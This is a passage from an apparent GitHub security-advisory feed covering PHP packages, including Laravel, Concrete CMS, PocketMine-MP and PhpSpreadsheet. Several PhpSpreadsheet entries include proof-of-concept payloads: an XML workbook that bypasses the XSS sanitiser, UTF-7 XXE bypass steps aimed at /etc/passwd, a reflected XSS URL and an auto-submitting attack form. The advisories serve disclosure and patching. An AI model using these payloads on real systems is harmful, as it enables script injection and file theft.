<li><a href="https://github.com/laravel/framework/commit/45287fb2a91c69bb1c110539b9b7341faf5aee33">https://github.com/laravel/framework/commit/45287fb2a91c69bb1c110539b9b7341faf5aee33</a></li>
<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/laravel/framework/CVE-2024-13918.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/laravel/framework/CVE-2024-13918.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-546h-56qp-8jmw">https://github.com/advisories/GHSA-546h-56qp-8jmw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-546h-56qp-8jmw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-10T12:30:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[concrete5/concrete5] Concrete CMS affected by a stored XSS in Folder Function.The "Add Folder" functionality]]></title>
        <id>https://github.com/advisories/GHSA-pvmx-mjmh-jfcx</id>
        <link href="https://github.com/advisories/GHSA-pvmx-mjmh-jfcx"/>
        <updated>2025-03-10T22:26:18.000Z</updated>
        <content type="html"><![CDATA[<p>Concrete CMS versions 9.0.0 through 9.3.9 are affected by a stored XSS in Folder Function.The "Add Folder" functionality lacks input sanitization, allowing a rogue admin to inject XSS payloads as folder names.&nbsp;&nbsp;The Concrete CMS security team gave this vulnerability a CVSS 4.0 Score of 4.8 with vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:P/VC:L/VI:N/VA:N/SC:L/SI:N/SA:N. Versions below 9 are not affected. Thanks, Alfin Joseph&nbsp;for reporting.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-0660">https://nvd.nist.gov/vuln/detail/CVE-2025-0660</a></li>
<li><a href="https://github.com/concretecms/bedrock/pull/370">https://github.com/concretecms/bedrock/pull/370</a></li>
<li><a href="https://github.com/concretecms/concretecms/pull/12454">https://github.com/concretecms/concretecms/pull/12454</a></li>
<li><a href="https://documentation.concretecms.org/9-x/developers/introduction/version-history/940-release-notes">https://documentation.concretecms.org/9-x/developers/introduction/version-history/940-release-notes</a></li>
<li><a href="https://github.com/advisories/GHSA-pvmx-mjmh-jfcx">https://github.com/advisories/GHSA-pvmx-mjmh-jfcx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pvmx-mjmh-jfcx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-10T21:31:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[laravel/framework] Laravel framework susceptible to reflected cross-site scripting]]></title>
        <id>https://github.com/advisories/GHSA-83wp-f5c3-hqqr</id>
        <link href="https://github.com/advisories/GHSA-83wp-f5c3-hqqr"/>
        <updated>2025-03-10T20:51:20.000Z</updated>
        <content type="html"><![CDATA[<p>The Laravel framework versions between 11.9.0 and 11.35.1 are susceptible to reflected cross-site scripting due to an improper encoding of route parameters in the debug-mode error page.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-13919">https://nvd.nist.gov/vuln/detail/CVE-2024-13919</a></li>
<li><a href="https://github.com/laravel/framework/pull/53869">https://github.com/laravel/framework/pull/53869</a></li>
<li><a href="https://github.com/laravel/framework/releases/tag/v11.36.0">https://github.com/laravel/framework/releases/tag/v11.36.0</a></li>
<li><a href="https://github.com/sbaresearch/advisories/tree/public/2024/SBA-ADV-20241209-02_Laravel_Reflected_XSS_via_Route_Parameter_in_Debug-Mode_Error_Page">https://github.com/sbaresearch/advisories/tree/public/2024/SBA-ADV-20241209-02_Laravel_Reflected_XSS_via_Route_Parameter_in_Debug-Mode_Error_Page</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/03/10/4">http://www.openwall.com/lists/oss-security/2025/03/10/4</a></li>
<li><a href="https://github.com/laravel/framework/commit/45287fb2a91c69bb1c110539b9b7341faf5aee33">https://github.com/laravel/framework/commit/45287fb2a91c69bb1c110539b9b7341faf5aee33</a></li>
<li><a href="https://github.com/advisories/GHSA-83wp-f5c3-hqqr">https://github.com/advisories/GHSA-83wp-f5c3-hqqr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-83wp-f5c3-hqqr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-10T12:30:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pocketmine/pocketmine-mp] PocketMine-MP allows malicious client data to waste server resources due to lack of limits for explode()]]></title>
        <id>https://github.com/advisories/GHSA-g274-c6jj-h78p</id>
        <link href="https://github.com/advisories/GHSA-g274-c6jj-h78p"/>
        <updated>2025-03-10T20:29:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Due to lack of limits by default in the <a href="https://www.php.net/manual/en/function.explode.php"><code>explode()</code></a> function, malicious clients were able to abuse some packets to waste server CPU and memory.</p>
<p>This is similar to a previous security issue published in <a href="https://github.com/pmmp/PocketMine-MP/security/advisories/GHSA-gj94-v4p9-w672">https://github.com/pmmp/PocketMine-MP/security/advisories/GHSA-gj94-v4p9-w672</a>, but with a wider impact, including but not limited to:</p>
<ul>
<li>Sign editing</li>
<li>LoginPacket JWT parsing</li>
<li>Command parsing</li>
</ul>
<p>However, the estimated impact of these issues is low, due to other limits such as the packet decompression limit.</p>
<h3 id="patches">Patches</h3>
<p>The issue was fixed in 5.25.2 via d0d84d4c5195fb0a68ea7725424fda63b85cd831.</p>
<p>A custom PHPStan rule has also been introduced to the project, which will henceforth require that all calls to <code>explode()</code> within the codebase must specify the <code>limit</code> parameter.</p>
<h3 id="workarounds">Workarounds</h3>
<p>No simple way to fix this.
Given that sign editing is the easiest way this could be exploited, workarounds could include plugins pre-processing <code>BlockActorDataPacket</code> to check that the incoming text doesn't have more than 4 parts when split by <code>\n</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pmmp/PocketMine-MP/security/advisories/GHSA-g274-c6jj-h78p">https://github.com/pmmp/PocketMine-MP/security/advisories/GHSA-g274-c6jj-h78p</a></li>
<li><a href="https://github.com/pmmp/PocketMine-MP/security/advisories/GHSA-gj94-v4p9-w672">https://github.com/pmmp/PocketMine-MP/security/advisories/GHSA-gj94-v4p9-w672</a></li>
<li><a href="https://github.com/pmmp/PocketMine-MP/commit/d0d84d4c5195fb0a68ea7725424fda63b85cd831">https://github.com/pmmp/PocketMine-MP/commit/d0d84d4c5195fb0a68ea7725424fda63b85cd831</a></li>
<li><a href="https://github.com/advisories/GHSA-g274-c6jj-h78p">https://github.com/advisories/GHSA-g274-c6jj-h78p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g274-c6jj-h78p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-10T20:29:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpexcel] PhpSpreadsheet allows bypassing of XSS sanitizer using the javascript protocol and special characters]]></title>
        <id>https://github.com/advisories/GHSA-r57h-547h-w24f</id>
        <link href="https://github.com/advisories/GHSA-r57h-547h-w24f"/>
        <updated>2025-03-06T18:22:56.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Product:</strong> PhpSpreadsheet
<strong>Version:</strong> 3.8.0
<strong>CWE-ID:</strong> CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<strong>CVSS vector v.3.1:</strong> 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)
<strong>CVSS vector v.4.0:</strong> 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)
<strong>Description:</strong> an attacker can use special characters, so that the library processes the javascript protocol with special characters and generates an HTML link
<strong>Impact:</strong> executing arbitrary JavaScript code in the browser
<strong>Vulnerable component:</strong> class <code>PhpOffice\PhpSpreadsheet\Writer\Html</code>, method <code>generateRow</code>
<strong>Exploitation conditions:</strong> a user viewing a specially generated xml file
<strong>Mitigation:</strong> additional sanitization of special characters in a string
<strong>Researcher: Igor Sak-Sakovskiy (Positive Technologies)</strong></p>
<h1 id="research">Research</h1>
<p>The researcher discovered zero-day vulnerability Bypass XSS sanitizer using the javascript protocol and special characters in Phpspreadsheet.
The following code is written on the server, which translates the XML file into an HTML representation and displays it in the response.</p>
<p><em>Listing 4. Source code on the server</em></p>
<pre><code>&lt;?php

require __DIR__ . '/vendor/autoload.php';

$inputFileType = 'Xml';
$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader($inputFileType);  

$inputFileName = './doc/file.xml';
$spreadsheet = $reader-&gt;load($inputFileName); 
 
$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet); 
print($writer-&gt;generateHTMLAll());
</code></pre>
<p>The contents of the xml file - <code>./doc/file.xml</code></p>
<p><em>Listing 5. The contents of the xml file</em></p>
<pre><code>&lt;?xml version="1.0"?&gt; 
&lt;?mso-application progid="Excel.Sheet"?&gt; 
&lt;Workbook xmlns="urn:schemas-microsoft-com:office:spreadsheet" 
 xmlns:o="urn:schemas-microsoft-com:office:office" 
 xmlns:x="urn:schemas-microsoft-com:office:excel" 
 xmlns:ss="urn:schemas-microsoft-com:office:spreadsheet" 
 xmlns:html="http://www.w3.org/TR/REC-html40"&gt; 
 &lt;DocumentProperties xmlns="urn:schemas-microsoft-com:office:office"&gt; 
  &lt;Author&gt;author&lt;/Author&gt; 
  &lt;LastAuthor&gt;author&lt;/LastAuthor&gt; 
  &lt;Created&gt;2015-06-05T18:19:34Z&lt;/Created&gt; 
  &lt;LastSaved&gt;2024-12-25T10:16:07Z&lt;/LastSaved&gt; 
  &lt;Version&gt;16.00&lt;/Version&gt; 
 &lt;/DocumentProperties&gt; 
 &lt;OfficeDocumentSettings xmlns="urn:schemas-microsoft-com:office:office"&gt; 
  &lt;AllowPNG/&gt; 
 &lt;/OfficeDocumentSettings&gt; 
 &lt;ExcelWorkbook xmlns="urn:schemas-microsoft-com:office:excel"&gt; 
  &lt;WindowHeight&gt;11020&lt;/WindowHeight&gt; 
  &lt;WindowWidth&gt;19420&lt;/WindowWidth&gt; 
  &lt;WindowTopX&gt;32767&lt;/WindowTopX&gt; 
  &lt;WindowTopY&gt;32767&lt;/WindowTopY&gt; 
  &lt;ProtectStructure&gt;False&lt;/ProtectStructure&gt; 
  &lt;ProtectWindows&gt;False&lt;/ProtectWindows&gt; 
 &lt;/ExcelWorkbook&gt; 
 &lt;Styles&gt; 
  &lt;Style ss:ID="Default" ss:Name="Normal"&gt; 
   &lt;Alignment ss:Vertical="Bottom"/&gt; 
   &lt;Borders/&gt; 
   &lt;Font ss:FontName="Calibri" x:Family="Swiss" ss:Size="11" ss:Color="#000000"/&gt; 
   &lt;Interior/&gt; 
   &lt;NumberFormat/&gt; 
   &lt;Protection/&gt; 
  &lt;/Style&gt; 
  &lt;Style ss:ID="s16"&gt; 
   &lt;NumberFormat ss:Format="General Date"/&gt; 
  &lt;/Style&gt; 
 &lt;/Styles&gt; 
 &lt;Worksheet ss:Name="Лист1"&gt; 
  &lt;Table ss:ExpandedColumnCount="2" ss:ExpandedRowCount="6" x:FullColumns="1" 
   x:FullRows="1" ss:DefaultRowHeight="14.5"&gt; 
   &lt;Column ss:AutoFitWidth="0" ss:Width="194"/&gt; 
   &lt;Row&gt; 
     &lt;Cell ss:Formula="=HYPERLINK (CHAR(20) &amp;amp; &amp;quot;j&amp;quot; &amp;amp; CHAR(13) &amp;amp; &amp;quot;avascript:alert(1)&amp;quot;)"&gt;&lt;Data ss:Type="String"&gt;&lt;/Data&gt;&lt;/Cell&gt; 
   &lt;/Row&gt; 
  &lt;/Table&gt; 
  &lt;WorksheetOptions xmlns="urn:schemas-microsoft-com:office:excel"&gt; 
   &lt;PageSetup&gt; 
    &lt;Header x:Margin="0.3"/&gt; 
    &lt;Footer x:Margin="0.3"/&gt; 
    &lt;PageMargins x:Bottom="0.75" x:Left="0.7" x:Right="0.7" x:Top="0.75"/&gt; 
   &lt;/PageSetup&gt; 
   &lt;Selected/&gt; 
   &lt;TopRowVisible&gt;1&lt;/TopRowVisible&gt; 
   &lt;Panes&gt; 
    &lt;Pane&gt; 
     &lt;Number&gt;3&lt;/Number&gt; 
     &lt;ActiveRow&gt;6&lt;/ActiveRow&gt; 
    &lt;/Pane&gt; 
   &lt;/Panes&gt; 
   &lt;ProtectObjects&gt;False&lt;/ProtectObjects&gt; 
   &lt;ProtectScenarios&gt;False&lt;/ProtectScenarios&gt; 
  &lt;/WorksheetOptions&gt; 
 &lt;/Worksheet&gt;
&lt;/Workbook&gt;
</code></pre>
<p>Due to the load with a special character in front of the javascript protocol, the execution flow hits line 1595, not 1593.</p>
<p><em>Figure 4. Generating a link bypassing a regular expression</em>
<img alt="fig4" src="https://github.com/user-attachments/assets/9bd2299d-9045-4cab-b3a5-cbcaf3bbe23c"></p>
<p>In the response from the server, you can see which special character is located in front of the javascript protocol after conversion.</p>
<p><em>Figure 5. Response from the server with a special character</em>
<img alt="fig5" src="https://github.com/user-attachments/assets/3fecbd9b-b08e-4797-9f5d-06911f857059"></p>
<p>When viewing the rendered result, a link becomes visible in the browser, and when clicked, the embedded JavaScript code will be executed.</p>
<p><em>Figure 6. Executing JavaScript code</em>
<img src="https://github.com/user-attachments/assets/b8ff1aeb-ba3b-49c1-a3b4-9e2cc1fc52d1" alt="fig6" width="595"></p>
<hr>
<h2 id="credit">Credit</h2>
<p>Igor Sak-Sakovskiy (Positive Technologies)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-r57h-547h-w24f">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-r57h-547h-w24f</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/cde2926a9e2baf146783f8fd1771bbed7d1dc7b3">https://github.com/PHPOffice/PhpSpreadsheet/commit/cde2926a9e2baf146783f8fd1771bbed7d1dc7b3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-23210">https://nvd.nist.gov/vuln/detail/CVE-2025-23210</a></li>
<li><a href="https://github.com/advisories/GHSA-r57h-547h-w24f">https://github.com/advisories/GHSA-r57h-547h-w24f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r57h-547h-w24f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-03T15:39:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpexcel] XXE in PHPSpreadsheet's XLSX reader]]></title>
        <id>https://github.com/advisories/GHSA-7cc9-j4mv-vcjp</id>
        <link href="https://github.com/advisories/GHSA-7cc9-j4mv-vcjp"/>
        <updated>2025-03-06T18:22:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <a href="https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php">XmlScanner class</a> has a <a href="https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L72">scan</a> method which should prevent XXE attacks.</p>
<p>However, we found another bypass than the previously reported <code>CVE-2024-47873</code>, the regexes from the <a href="https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L51">findCharSet</a> method, which is used for determining the current encoding can be bypassed by using a payload in the encoding UTF-7, and adding at end of the file a comment with the value <code>encoding="UTF-8"</code> with <code>"</code>, which is matched by the first regex, so that <code>encoding='UTF-7'</code> with single quotes <code>'</code> in the XML header is not matched by the second regex: </p>
<pre><code> $patterns = [
            '/encoding\\s*=\\s*"([^"]*]?)"/',
            "/encoding\\s*=\\s*'([^']*?)'/",
        ];
</code></pre>
<p>A payload for the <code>workbook.xml</code> file can for example be created with <a href="https://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-7%20(65000)')&amp;input=Pz4KPCFET0NUWVBFIGZvbyBbCiAgPCFFTEVNRU5UIGZvbyBBTlkgPgogIDwhRU5USVRZIHh4ZSBTWVNURU0gImZpbGU6Ly8vZXRjL3Bhc3N3ZCIgPl0%2BCjxmb28%2BJnh4ZTs8L2Zvbz4K">CyberChef</a>.
If you open an Excel file containing the payload from the link above stored in the <code>workbook.xml</code> file with PhpSpreadsheet, you will receive an HTTP request on <code>127.0.0.1:12345</code>. You can test that an HTTP request is created by running the <code>nc -nlvp 12345</code> command before opening the file containing the payload with PhpSpreadsheet.</p>
<p>To create the payload you need:</p>
<ol>
<li>Create a file containing <code>&lt;?xml version = "1.0" encoding='UTF-7'</code> in an XML file</li>
<li>Use the link attached above to create your XXE payload and add it to the XML file. </li>
<li>Add <code>+ADw-+ACE---encoding="UTF-8"--+AD4-</code> to the end of the XML file, which is matched by the first regex.</li>
</ol>
<h3 id="poc">PoC</h3>
<p><a href="https://github.com/user-attachments/files/17375792/payload.xlsx">payload.xlsx</a></p>
<ul>
<li>Create a new folder.</li>
<li>Run the <code>composer require phpoffice/phpspreadsheet</code> command in the new folder.</li>
<li>Create an <code>index.php</code> file in that folder with the following content:</li>
</ul>
<pre><code class="language-PHP">&lt;?php
require 'vendor/autoload.php';

use PhpOffice\PhpSpreadsheet\Spreadsheet;
use PhpOffice\PhpSpreadsheet\Writer\Xlsx;

$spreadsheet = new Spreadsheet();

$inputFileType = 'Xlsx';
$inputFileName = './payload.xlsx';

/**  Create a new Reader of the type defined in $inputFileType  **/
$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader($inputFileType);
/**  Advise the Reader that we only want to load cell data  **/
$reader-&gt;setReadDataOnly(true);

$worksheetData = $reader-&gt;listWorksheetInfo($inputFileName);

foreach ($worksheetData as $worksheet) {

$sheetName = $worksheet['worksheetName'];

echo "&lt;h4&gt;$sheetName&lt;/h4&gt;";
/**  Load $inputFileName to a Spreadsheet Object  **/
$reader-&gt;setLoadSheetsOnly($sheetName);
$spreadsheet = $reader-&gt;load($inputFileName);

$worksheet = $spreadsheet-&gt;getActiveSheet();
print_r($worksheet-&gt;toArray());

}
</code></pre>
<ul>
<li>Run the following command: <code>php -S 127.0.0.1:8080</code></li>
<li>Add the <a href="https://github.com/user-attachments/files/17375792/payload.xlsx">payload.xlsx</a> file in the folder and open <a href="https://127.0.0.1:8080">https://127.0.0.1:8080</a> in a browser. You will see an HTTP request on netcat <a href="http://127.0.0.1:12345/ext.dtd">http://127.0.0.1:12345/ext.dtd</a>.</li>
</ul>
<h3 id="impact">Impact</h3>
<p>An attacker can bypass the sanitizer and achieve an <a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">XXE attack</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-7cc9-j4mv-vcjp">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-7cc9-j4mv-vcjp</a></li>
<li><a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-48917">https://nvd.nist.gov/vuln/detail/CVE-2024-48917</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php">https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php</a></li>
<li><a href="https://github.com/advisories/GHSA-7cc9-j4mv-vcjp">https://github.com/advisories/GHSA-7cc9-j4mv-vcjp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7cc9-j4mv-vcjp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-11-18T20:01:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpexcel] PhpSpreadsheet allows unauthorized Reflected XSS in the constructor of the Downloader class]]></title>
        <id>https://github.com/advisories/GHSA-jmpx-686v-c3wx</id>
        <link href="https://github.com/advisories/GHSA-jmpx-686v-c3wx"/>
        <updated>2025-03-06T18:21:36.000Z</updated>
        <content type="html"><![CDATA[<h1 id="unauthorized-reflected-xss-in-the-constructor-of-the-downloader-class">Unauthorized Reflected XSS in the constructor of the <code>Downloader</code> class</h1>
<p><strong>Product</strong>: Phpspreadsheet
<strong>Version</strong>: version 3.6.0
<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<strong>CVSS vector v.3.1</strong>: 8.2 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)
<strong>CVSS vector v.4.0</strong>: 8.3 (AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L)
<strong>Description</strong>: using the <code>/vendor/phpoffice/phpspreadsheet/samples/download.php</code> script, an attacker can perform a XSS-type attack
<strong>Impact</strong>: execution of arbitrary JavaScript code in the browser
<strong>Vulnerable component</strong>: the constructor of the <code>Downloader</code> class
<strong>Exploitation conditions</strong>: an unauthorized user
<strong>Mitigation</strong>: sanitization of the <code>name</code> and <code>type</code> variables
<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>
<h1 id="research">Research</h1>
<p>The researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in the constructor of the <code>Downloader</code> class) in Phpspreadsheet.</p>
<p>The latest version (3.6.0) of the <code>phpoffice/phpspreadsheet</code> library was installed. The installation was carried out with the inclusion of examples.</p>
<p><em>Listing 1. Installing the <code>phpoffice/phpspreadsheet</code> library</em></p>
<pre><code>$ composer require phpoffice/phpspreadsheet --prefer-source
</code></pre>
<p>The <code>./vendor/phpoffice/phpspreadsheet/samples/download.php</code> file processes the GET parameters <code>name</code> and <code>type</code>.</p>
<p><img alt="fig1" src="https://github.com/user-attachments/assets/78d5b3c7-e2ab-4487-98e2-a975f74a71c0"></p>
<p><em>Figure 1. The <code>./vendor/phpoffice/phpspreadsheet/samples/download.php</code> file accepts GET parameters.</em></p>
<p>Consider the constructor of the <code>Downloader</code> class, where GET parameters are passed. Error is displayed without sanitization using GET parameters transmitted from the user.</p>
<p><img alt="fig2" src="https://github.com/user-attachments/assets/00baf1f8-298c-4654-a3e4-b99cf8053eac"></p>
<p><em>Figure 2. Error is displayed without sanitization</em></p>
<p>When clicking on the following link, arbitrary JavaScript code will be executed.</p>
<p><em>Listing 2.</em></p>
<pre><code>https://192.***.***.***/vendor/phpoffice/phpspreadsheet/samples/download.php?name=%3Cimg%20src=1%20onerror=alert()%3E&amp;type=1
</code></pre>
<p>Demonstration of the execution of arbitrary JavaScript code.</p>
<img src="https://github.com/user-attachments/assets/745d6e21-396f-4357-8ff8-e856adf15fee" alt="fig3" width="537">

<p><em>Figure 3. Executing arbitrary JavaScript code</em></p>
<h1 id="credit">Credit</h1>
<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-jmpx-686v-c3wx">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-jmpx-686v-c3wx</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4#diff-fbb0f53a5c68eeeffaa9ab35552c0b01740396f1a4045af5d2935ec2a62a7816">https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4#diff-fbb0f53a5c68eeeffaa9ab35552c0b01740396f1a4045af5d2935ec2a62a7816</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56365">https://nvd.nist.gov/vuln/detail/CVE-2024-56365</a></li>
<li><a href="https://github.com/advisories/GHSA-jmpx-686v-c3wx">https://github.com/advisories/GHSA-jmpx-686v-c3wx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jmpx-686v-c3wx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-01-03T17:06:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpexcel] PhpSpreadsheet allows unauthorized Reflected XSS in the Accounting.php file]]></title>
        <id>https://github.com/advisories/GHSA-c6fv-7vh8-2rhr</id>
        <link href="https://github.com/advisories/GHSA-c6fv-7vh8-2rhr"/>
        <updated>2025-03-06T18:20:26.000Z</updated>
        <content type="html"><![CDATA[<h1 id="unauthorized-reflected-xss-in-the-accountingphp-file">Unauthorized Reflected XSS in the <code>Accounting.php</code> file</h1>
<p><strong>Product</strong>: Phpspreadsheet
<strong>Version</strong>: version 3.6.0
<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<strong>CVSS vector v.3.1</strong>: 8.2 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)
<strong>CVSS vector v.4.0</strong>: 8.3 (AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L)
<strong>Description</strong>: using the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php</code> script, an attacker can perform a XSS-type attack
<strong>Impact</strong>: executing arbitrary JavaScript code in the browser
<strong>Vulnerable component</strong>: the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php</code> file
<strong>Exploitation conditions</strong>: an unauthorized user
<strong>Mitigation</strong>: sanitization of the currency variable
<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>
<h1 id="research">Research</h1>
<p>The researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in <code>Accounting.php</code> file) in Phpspreadsheet.</p>
<p>There is no sanitization in the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php</code> file, which leads to the possibility of a XSS attack.
Strings are formed using the currency parameter without sanitization, which is controlled by the attacker.</p>
<p><img alt="fig7" src="https://github.com/user-attachments/assets/da0ee52d-2306-4770-a61d-bce4ba553f4f"></p>
<p><em>Figure 7. A fragment of the query in which a string and a parameter are formed without sanitization</em></p>
<p>An attacker can prepare a special HTML form that will be automatically sent to the vulnerable scenario.</p>
<p><em>Listing 4. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>
<pre><code>&lt;html&gt;
  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
  &lt;body&gt;
    &lt;form action="https://192.***.***.***/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php" method="POST"&gt;
      &lt;input type="hidden" name="number" value="1234&amp;#46;5678" /&gt;
      &lt;input type="hidden" name="currency" value="&amp;#36;&amp;lt;img&amp;#32;src&amp;#61;1&amp;#32;onerror&amp;#61;alert&amp;#40;&amp;#41;&amp;gt;" /&gt;
      &lt;input type="hidden" name="decimals" value="2" /&gt;
      &lt;input type="hidden" name="position" value="1" /&gt;
      &lt;input type="hidden" name="spacing" value="0" /&gt;
      &lt;input type="hidden" name="submit" value="Display&amp;#32;Mask" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      history.pushState('', '', '/');
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>After sending the script provided in Listing 4, the XSS vulnerability is exploited. Figure 8 shows the execution of arbitrary JavaScript code during the submission of a POST form.</p>
<img src="https://github.com/user-attachments/assets/b009256e-61f7-4d72-8f6a-cc6e0efe2bb1" alt="fig8" width="460">

<p><em>Figure 8. Executing arbitrary JavaScript code</em></p>
<h1 id="credit">Credit</h1>
<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-c6fv-7vh8-2rhr">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-c6fv-7vh8-2rhr</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4">https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56366">https://nvd.nist.gov/vuln/detail/CVE-2024-56366</a></li>
<li><a href="https://github.com/advisories/GHSA-c6fv-7vh8-2rhr">https://github.com/advisories/GHSA-c6fv-7vh8-2rhr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c6fv-7vh8-2rhr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-01-03T17:06:23.000Z</published>
    </entry>
    <entry>
